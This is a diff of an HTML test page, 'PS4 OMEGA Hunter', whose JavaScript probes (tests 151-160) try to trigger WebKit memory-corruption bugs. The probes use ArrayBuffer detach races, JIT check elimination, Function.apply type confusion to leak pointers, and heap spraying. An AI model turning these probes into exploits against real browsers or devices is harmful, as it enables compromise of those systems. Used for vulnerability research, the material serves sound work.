@@ -2,30 +2,41 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 OMEGA Hunter (146-150)</title>
+<title>PS4 OMEGA Hunter (151-160)</title>
 <style>
-    body { background: #000; color: #ffaa00; font-family: 'Consolas', monospace; }
-    button { width: 100%; padding: 12px; margin: 5px 0; background: #221100; color: #ffaa00; border: 1px solid #ffaa00; cursor: pointer; }
-    button:hover { background: #ffaa00; color: #000; }
-    #log { border: 1px solid #ffaa00; padding: 10px; margin-top: 20px; height: 350px; overflow-y: scroll; white-space: pre-wrap; font-size: 11px;}
+    body { background: #000; color: #00ffff; font-family: 'Consolas', monospace; }
+    button { width: 100%; padding: 12px; margin: 5px 0; background: #002222; color: #00ffff; border: 1px solid #00ffff; cursor: pointer; }
+    button:hover { background: #00ffff; color: #000; }
+    #log { border: 1px solid #00ffff; padding: 10px; margin-top: 20px; height: 350px; overflow-y: scroll; white-space: pre-wrap; font-size: 11px;}
+    .success { color: #ff0000; font-weight: bold; font-size: 1.2em; }
 </style>
 </head>
 <body>
 
-<h1>SUITE v1230000: DETACH BYPASS</h1>
+<h1>SUITE v1240000: STACK LEAK & JIT</h1>
 <hr>
-<div>Foco: JIT Check Elimination, DataView Race & RegExp Memory</div>
+<div>Foco: Function.apply Type Confusion, Reflect.construct & JIT Write Bypass</div>
 <br>
 
-<button onclick="run(t146)">146. JIT Loop Hoisting Detach Bypass</button>
+<button onclick="run(t151)">151. Function.apply Double/Object Confusion</button>
 
-<button onclick="run(t147)">147. DataView.setInt8 Detach Race</button>
+<button onclick="run(t152)">152. Reflect.construct Array Shrink Race</button>
 
-<button onclick="run(t148)">148. ArrayBuffer byteLength Getter Hijack</button>
+<button onclick="run(t153)">153. JIT Optimized arguments Access</button>
 
-<button onclick="run(t149)">149. RegExp result.index Out-of-Bounds</button>
+<button onclick="run(t154)">154. Array.splice Species Constructor Hijack</button>
 
-<button onclick="run(t150)">150. Function.apply Argument Leak</button>
+<button onclick="run(t155)">155. [...Array] Spread Syntax Resize</button>
+
+<button onclick="run(t156)">156. JIT Loop Hoisting Write (T146 Refined)</button>
+
+<button onclick="run(t157)">157. Math.max.apply Stack Limit Edge</button>
+
+<button onclick="run(t158)">158. Proxy Argument Revocation in Apply</button>
+
+<button onclick="run(t159)">159. Function.bind + Apply Argument Mix</button>
+
+<button onclick="run(t160)">160. Error.stack Access during Spread</button>
 
 <hr>
 <div id="log">Status: Aguardando...</div>
@@ -41,169 +52,37 @@
     }
 
     // =================================================================
-    // 146. JIT Loop Hoisting Detach Bypass
-    // Alvo: DFG JIT (Data Flow Graph)
-    // Lógica: O erro do Teste 124 ocorreu no interpretador ou baseline JIT.
-    // Aqui, criamos um loop "quente". O JIT pode decidir mover a verificação
-    // "IsDetached?" para FORA do loop (Hoisting) para ganhar velocidade.
-    // Se detachedarmos o buffer DEPOIS do hoisting mas DENTRO do loop, boom.
-    // =================================================================
-    function t146() {
-        const buf = new ArrayBuffer(1024);
-        const view = new Uint8Array(buf);
-        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
-
-        // Função para ser otimizada
-        function hot_loop(v, do_detach) {
-            let res = 0;
-            // O JIT deve assumir que 'v' é um TypedArray válido e remover checks redundantes
-            for (let i = 0; i < 10000; i++) {
-                res += v[0]; // Acesso rápido
-                
-                if (i === 9000 && do_detach) {
-                    // AÇÃO: Detach dentro do loop otimizado
-                    worker.postMessage(buf, [buf]);
-                }
-            }
-            return res;
-        }
-
-        // 1. Treina o JIT (Warm-up)
-        for (let i = 0; i < 100; i++) hot_loop(view, false);
-
-        // 2. Executa o ataque
-        try {
-            hot_loop(view, true);
-            log.innerText += "\n[+] Loop completou sem erro (Verificar memória).";
-        } catch(e) {
-            // Se der o erro "detached", o JIT manteve a checagem :(
-            log.innerText += "\n[-] JIT Check falhou: " + e.message;
-        }
-    }
-
-    // =================================================================
-    // 147. DataView.setInt8 Detach Race
-    // Alvo: DataView Implementation
-    // Lógica: DataViews são mais lentas e complexas que TypedArrays.
-    // Às vezes a implementação esquece de checar o buffer em operações de escrita
-    // se o offset for dinâmico.
-    // =================================================================
-    function t147() {
-        const buf = new ArrayBuffer(1024);
-        const dv = new DataView(buf);
-        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
-
-        try {
-            // Tenta criar uma situação onde o argumento 'value' é calculado
-            // APÓS a verificação do buffer, mas ANTES da escrita.
-            const val = {
-                valueOf: () => {
-                    // Detach agora!
-                    worker.postMessage(buf, [buf]);
-                    return 0xFF;
-                }
-            };
-            
-            // DataView.setInt8(offset, value)
-            // A ordem de avaliação do WebKit é crítica aqui.
-            dv.setInt8(0, val);
-            
-            log.innerText += "\n[+] DataView write em detached buffer!";
-        } catch(e) {
-            log.innerText += "\n[-] DataView protegido: " + e.message;
-        }
-    }
-
-    // =================================================================
-    // 148. ArrayBuffer byteLength Getter Hijack
-    // Alvo: WebIDL Bindings
-    // Lógica: Se o WebKit checa `buffer.byteLength` para verificar validade,
-    // tentamos substituir esse getter para mentir para o motor, dizendo que
-    // o buffer ainda tem tamanho mesmo estando vazio.
-    // =================================================================
-    function t148() {
-        const buf = new ArrayBuffer(1024);
-        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
-        
-        // Hijack do getter no protótipo (se permitido) ou na instância
-        try {
-            Object.defineProperty(buf, 'byteLength', {
-                get: function() {
-                    // Mente para o sistema
-                    return 1024;
-                }
-            });
-        } catch(e) {
-            log.innerText += "\n[*] DefineProperty falhou (esperado em objetos nativos selados).";
-        }
-
-        // Detach
-        worker.postMessage(buf, [buf]);
-        
-        try {
-            // Tenta criar view baseada no tamanho "falso"
-            const view = new Uint8Array(buf);
-            log.innerText += "\n[CRITICAL] View criada em buffer mentiroso!";
-        } catch(e) {
-            log.innerText += "\n[-] Getter ignorado pelo motor C++: " + e.message;
-        }
-    }
-
-    // =================================================================
-    // 149. RegExp result.index Out-of-Bounds
-    // Alvo: RegExp JIT
-    // Lógica: Tentar fazer o motor de RegExp retornar um índice de match
-    // que aponte para fora da string original, permitindo leitura de heap adjacente.
-    // =================================================================
-    function t149() {
-        // String gigante para forçar alocação separada
-        const s = "A".repeat(1024 * 1024); 
-        // RegExp que busca no final
-        const re = /A$/;
-        
-        // Executa
-        const res = re.exec(s);
-        
-        if (res) {
-            // Tenta confundir o ponteiro 'input' do resultado
-            // modificando a string original via flatten/rope trick
-            const old_input = res.input;
-            
-            // Se o índice for válido mas a string subjacente mudou/morreu...
-            if (res.index === 1024*1024 - 1) {
-                log.innerText += "\n[+] RegExp index normal.";
-            } else {
-                log.innerText += "\n[!] RegExp index estranho: " + res.index;
-            }
-        }
-    }
-
-    // =================================================================
-    // 150. Function.apply Argument Leak
+    // 151. Function.apply Double/Object Confusion
     // Alvo: Stack Arguments
-    // Lógica: `func.apply(null, array)` espalha o array na pilha.
-    // Se usarmos um array com getter que redimensiona o array durante o espalhamento,
-    // o loop de cópia de argumentos pode ler memória fora dos limites do array.
+    // Lógica: Baseado no T150. Criamos um array de Doubles.
+    // No meio do spread, mudamos o array para conter Objetos.
+    // Se o 'apply' já alocou a stack pensando que eram Doubles, ele pode
+    // ler o ponteiro do objeto e tratá-lo como um número (NaN boxing leak).
     // =================================================================
-    function t150() {
-        const arr = new Array(1000);
-        arr.fill(1);
+    function t151() {
+        const arr = [1.1];
+        // Enche com doubles para definir o tipo do array
+        for(let i=0; i<1000; i++) arr.push(2.2);
         
-        // Define um getter no meio que encolhe o array
+        const obj = {a: 1};
+        
+        // Define getter no meio
         Object.defineProperty(arr, 500, {
             get: () => {
-                arr.length = 1; // Encolhe violentamente
-                keeper.push(new Uint32Array(10000)); // Spray
-                return 0;
+                // AÇÃO: Transforma o array de Doubles para Array de Objects
+                arr[501] = obj; 
+                return 3.3;
             }
         });
         
         function target(...args) {
-            // Verifica se recebeu lixo nos argumentos finais
-            if (args.length === 1000 && args[999] !== 1) {
-                log.innerText += "\n[CRITICAL] Stack Argument Leak detectado! Arg[999]: " + args[999];
+            const val = args[501];
+            // Se a confusão funcionou, 'val' será um número estranho (o ponteiro do obj)
+            // Se funcionou seguro, será o objeto {a:1}
+            if (typeof val === 'number' && val !== 2.2) {
+                log.innerHTML += "\n<span class='success'>[CRITICAL] Pointer Leak: " + val + "</span>";
             } else {
-                log.innerText += "\n[+] Apply seguro. Len: " + args.length;
+                log.innerText += "\n[+] Tipo seguro: " + typeof val;
             }
         }
         
@@ -212,6 +91,252 @@
         } catch(e) {
             log.innerText += "\n[-] Erro: " + e.message;
         }
+    }
+
+    // =================================================================
+    // 152. Reflect.construct Array Shrink Race
+    // Alvo: Stack Arguments (Constructor)
+    // Lógica: Similar ao apply, mas para construtores. `Reflect.construct(Target, args)`.
+    // Encolhemos 'args' durante a construção.
+    // =================================================================
+    function t152() {
+        const args = new Array(200);
+        args.fill(1);
+        
+        Object.defineProperty(args, 100, {
+            get: () => {
+                args.length = 0; // Encolhe
+                keeper.push(new ArrayBuffer(1000));
+                return 2;
+            }
+        });
+        
+        function Target(...received) {
+            // Verifica o final da lista de argumentos
+            if (received.length === 200 && received[199] === undefined) {
+                 log.innerHTML += "\n<span class='success'>[CRITICAL] Reflect Stack Leak (undefined reading)!</span>";
+            } else {
+                 log.innerText += "\n[+] Reflect safe. Len: " + received.length;
+            }
+        }
+        
+        try {
+            Reflect.construct(Target, args);
+        } catch(e) {
+            log.innerText += "\n[-] Erro: " + e.message;
+        }
+    }
+
+    // =================================================================
+    // 153. JIT Optimized arguments Access
+    // Alvo: JIT Stack Frame
+    // Lógica: O objeto `arguments` é complexo para o JIT. Se ele for "escapado"
+    // (passado para outra função) e depois acessado num loop quente, o JIT
+    // pode otimizar o acesso direto à pilha, ignorando mudanças no objeto real.
+    // =================================================================
+    function t153() {
+        function escape(args) {
+            // Modifica o 'arguments' do chamador se possível, ou apenas segura
+            args.length = 0; 
+        }
+
+        function victim(a, b, c) {
+            const args = arguments;
+            escape(args); // Esvazia o objeto
+            
+            // Loop quente
+            let sum = 0;
+            for(let i=0; i<10000; i++) {
+                // JIT pode hardcodar o acesso à stack aqui, ignorando que args.length é 0
+                sum += args[2]; 
+            }
+            return sum;
+        }
+        
+        // Treina
+        for(let i=0; i<100; i++) victim(1,2,3);
+        
+        const res = victim(1,2,3);
+        if (Number.isNaN(res)) log.innerText += "\n[+] JIT arguments check (NaN).";
+        else log.innerText += "\n[!] JIT result: " + res;
+    }
+
+    // =================================================================
+    // 154. Array.splice Species Hijack
+    // Alvo: Array Buffer Calculation
+    // Lógica: Splice usa o construtor da espécie para criar o array de itens removidos.
+    // Se sequestrarmos isso, podemos confundir o cálculo de movimentação de memória?
+    // =================================================================
+    function t154() {
+        const arr = [1, 2, 3, 4, 5];
+        
+        // Hijack do construtor
+        arr.constructor = {
+            [Symbol.species]: function(len) {
+                // Retorna array menor que o solicitado
+                return new Array(0);
+            }
+        };
+        
+        try {
+            // Splice remove 2 itens. Espera criar array de tam 2.
+            // Recebe array de tam 0.
+            const removed = arr.splice(0, 2);
+            log.innerText += "\n[+] Splice species executado. Removed len: " + removed.length;
+        } catch(e) {
+            log.innerText += "\n[-] Erro: " + e.message;
+        }
+    }
+
+    // =================================================================
+    // 155. [...Array] Spread Syntax Resize
+    // Alvo: Iterator Protocol
+    // Lógica: A sintaxe de spread `[...]` usa iteradores.
+    // Definimos um iterador que altera o array original durante a iteração.
+    // =================================================================
+    function t155() {
+        const arr = [1, 2, 3];
+        
+        arr[Symbol.iterator] = function* () {
+            yield 1;
+            arr.length = 0; // Destrói fonte
+            yield 2;
+            yield 3;
+        };
+        
+        const res = [...arr];
+        log.innerText += "\n[+] Spread Mutation result len: " + res.length;
+    }
+
+    // =================================================================
+    // 156. JIT Loop Hoisting Write (T146 Refined)
+    // Alvo: JIT BCE (Bounds Check Elimination) / Detach Check
+    // Lógica: Tenta novamente o T146, mas com uma escrita real para causar crash/corruption
+    // se o check for removido.
+    // =================================================================
+    function t156() {
+        const buf = new ArrayBuffer(1024);
+        const view = new Uint8Array(buf);
+        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
+
+        function hot_write(v, do_detach) {
+            // Loop desenhado para encorajar o hoisting do check de buffer
+            for (let i = 0; i < 10000; i++) {
+                // Acesso dummy para o JIT aprender que 'v' é seguro
+                const safe = v[0];
+                
+                if (i === 9000 && do_detach) {
+                    worker.postMessage(buf, [buf]);
+                }
+                
+                // Se o check "isDetached" foi movido para fora do loop...
+                // Na iteração 9001, isso vai escrever em memória NULL ou liberada.
+                v[1] = 0xCC; 
+            }
+        }
+
+        // Treina
+        for(let i=0; i<100; i++) hot_write(view, false);
+        
+        try {
+            hot_write(view, true);
+            log.innerText += "\n[+] JIT Write Loop sobreviveu (Check funcionou).";
+        } catch(e) {
+            log.innerText += "\n[-] JIT Write bloqueado: " + e.message;
+        }
+    }
+
+    // =================================================================
+    // 157. Math.max.apply Stack Limit Edge
+    // Alvo: Stack Pointer
+    // Lógica: Passar muitos argumentos para Math.max pode estourar a stack.
+    // Tentamos encontrar o limite exato onde ele não crasha, mas corrompe o frame.
+    // =================================================================
+    function t157() {
+        // Tenta 65536 argumentos (limite comum de engines)
+        const arr = new Array(65536).fill(1);
+        try {
+            const max = Math.max.apply(null, arr);
+            log.innerText += "\n[+] Math.max(64k) OK.";
+        } catch(e) {
+            log.innerText += "\n[-] Math.max falhou: " + e.message;
+        }
+    }
+
+    // =================================================================
+    // 158. Proxy Argument Revocation in Apply
+    // Alvo: Argument Spread
+    // Lógica: Passar um proxy que revoga a si mesmo quando lido pelo `apply`.
+    // =================================================================
+    function t158() {
+        const {proxy, revoke} = Proxy.revocable({}, {
+            get: function(target, prop) {
+                if (prop === 'value') { // Se o apply ler algo
+                    revoke();
+                }
+                return 1;
+            }
+        });
+        
+        // Array contendo o proxy
+        const arr = [proxy];
+        
+        try {
+            // Tenta passar o proxy para uma função
+            (function(a){}).apply(null, arr);
+            log.innerText += "\n[+] Proxy Revoke in Apply: OK";
+        } catch(e) {
+            log.innerText += "\n[-] Erro: " + e.message;
+        }
+    }
+
+    // =================================================================
+    // 159. Function.bind + Apply Argument Mix
+    // Alvo: BoundFunction Arguments
+    // Lógica: `bind` pré-aloca argumentos. `apply` adiciona mais.
+    // A junção interna desses dois arrays de argumentos pode ter bugs de cálculo de tamanho.
+    // =================================================================
+    function t159() {
+        function target(...args) {
+            return args.length;
+        }
+        
+        const bound = target.bind(null, 1, 2, 3);
+        const arr = new Array(1000);
+        
+        // Getter que encolhe
+        Object.defineProperty(arr, 500, {
+            get: () => { arr.length = 0; return 0; }
+        });
+        
+        try {
+            const len = bound.apply(null, arr);
+            log.innerText += "\n[+] Bind+Apply Len: " + len;
+        } catch(e) {
+            log.innerText += "\n[-] Erro: " + e.message;
+        }
+    }
+
+    // =================================================================
+    // 160. Error.stack Access during Spread
+    // Alvo: Stack Walker / Unwinder
+    // Lógica: Durante o spread (que está manipulando a stack), forçamos um erro
+    // e lemos `error.stack`. O gerador de stack trace pode se confundir com o frame incompleto.
+    // =================================================================
+    function t160() {
+        const arr = [1, 2];
+        Object.defineProperty(arr, 1, {
+            get: () => {
+                // Gera erro aqui
+                const e = new Error();
+                // Acessa stack trace imediatamente
+                const s = e.stack;
+                log.innerText += "\n[+] Stack trace captured (Len: " + s.length + ")";
+                return 2;
+            }
+        });
+        
+        (function(a,b){}).apply(null, arr);
     }
 
 </script>
